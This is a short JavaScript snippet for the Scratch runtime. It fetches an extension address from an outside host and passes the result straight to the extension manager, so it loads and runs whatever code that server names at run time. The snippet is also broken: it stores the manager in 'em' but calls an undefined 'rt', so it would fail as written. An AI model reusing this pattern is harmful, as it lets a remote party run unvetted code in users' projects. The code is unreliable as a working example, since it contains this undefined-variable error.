let em = Scratch.runtime.extensionManager;
fetch("https://cp.zeroink.dpdns.org/latestURL")
    .then(_ => _.text())
    .then(_ => rt.extensionManager.loadExtensionURL(_));